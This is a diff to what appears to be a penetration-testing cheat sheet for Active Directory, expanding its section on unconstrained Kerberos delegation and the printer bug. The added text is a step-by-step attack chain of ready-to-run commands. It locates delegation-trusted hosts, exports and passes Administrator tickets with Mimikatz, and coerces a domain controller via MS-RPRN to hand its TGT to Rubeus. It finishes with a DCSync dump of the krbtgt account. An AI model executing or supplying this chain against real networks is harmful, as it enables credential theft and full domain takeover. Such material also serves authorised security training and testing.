@@ -1049,56 +1049,64 @@ Set-ADUser -Identity User01 -ServicePrincipalNames @{Add='dcorp/whatever1'}
 
 ### Kerberos Delegation
 
-### Unconstrained Delegation
+### Unconstrained Delegation and Printer Bug
 
-**1. With Powerview:**
 ```powershell
+# With PowerView
 # Search for domain computers with unconstrained delegation enabled
-Get-NetComputer -UnConstrained
+Get-DomainComputer -UnConstrained
+
 # Search for domain computers with unconstrained delegation enabled from property name
-Get-NetComputer -Unconstrained | select -ExpandProperty name
+Get-DomainComputer -Unconstrained | select -ExpandProperty name
+
 # Search for domain computers with unconstrained delegation enabled from property dnshostname
 Get-NetComputer -Unconstrained | select -ExpandProperty dnshostname
-```
-**2. With AD Module:**
-```powershell
-# Search for domain computers with unconstrained delegation enabled
+
+# With AD module
+# Search for domain computers with unconstrained delegation enabled 
 Get-ADComputer -Filter {TrustedForDelegation -eq $True}
 Get-ADUser -Filter {TrustedForDelegation -eq $True}
+
+# Now that we identified a computer trusted for delegation, we need to get local admin access to that computer.
+# After getting privileges we have to wait for a high privilege user to logon on the computer.
+# Since there is delegation, the computer can decrypt the TGS that contains the TGT of the user connected.
+# So TGT of the elevated user is available and can be used to impersonate 
+
+# Need to wait for a login from administrator (or other user)
+
+# Exporting all tickets on the trusted computer
+Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
+
+# Using administrator ticket (if administrator connected to the trusted server:
+Invoke-Mimikatz -Command '"kerberos::ptt c:\users\appadmin\[0;2ce8b3]-02-60a1000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'
+# "[0;2ce8b3]-02-60a1000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi" is the file containing the TGT of Administrator exported before
+
+# The problem now is: there a way to trigger some users or computer to logon, without waiting an admin interaction?
+# There is if some pre-requisites are mateched.
 ```
 
-### Printer Bug
+### Unconstrained Delegation and Printer Bug
 
-#### Pre-requisites
-#### Rubeus:
 ```powershell
-.\Rubeus.exe
-```
-Link: [Rubeus](https://github.com/GhostPack/Rubeus)
-#### Ms-rprn:
-```powershell
-.\MS-RPRN.exe
-```
-Link: [MS-RPRN](https://github.com/leechristensen/SpoolSample)
+# MS-RPRN is Microsoft’s Print System Remote Protocol. It defines the communication of print job processing and print system management between a print client and a print server.
+# It's possible to ask to a computer to contact the spooler on a third server.
+# The DC will authenticate with its own computer account on the  third server.
+# What if the third server is an owned computer trusted for delegation?
+# it sohuld be possible to capture the DC TGT 
 
-**1. Capture the TGT:**
-```powershell
-# Start monitoring for any authentication
+# On the trusted server, use rubeus in monitor mode to listen for incoming tickets 
 .\Rubeus.exe monitor /interval:5 /nowrap
-```
-**2. Run MS-RPRN.exe:**
-```powershell
-# Run MS-RPRN.exe to abuse the printer bug
+
+# from a domain joined machine ask to a DC to notify MS-RPRN to the owned server:
 .\MS-RPRN.exe \\dcorp.corp.corporate.local \\dcorp-appsrv.corp.corporate.local
-```
-**3. Copy the base64 encoded TGT, remove extra spaces:**
-```powershell
-# Use the ticket
-.\Rubeus.exe ptt /ticket:<TGTofCorp>
-```
-**4. DCSync attack against Corp using the injected ticket:**
-```powershell
-# Run DCSync with Mimikatz
+
+# some tickets will be printed by the rubeus session monitor mode in base64 format.
+# Copy the TGT ticket, remove blanks and new line chars
+# paste the TGT in a Rubeus command:
+.\Rubeus.exe ptt /ticket:XXXXa.....==
+
+#  Now the current session has the same rights as the DC
+# It's possibile to run a DCSYnc attack:
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:corp\krbtgt"'
 ```
 
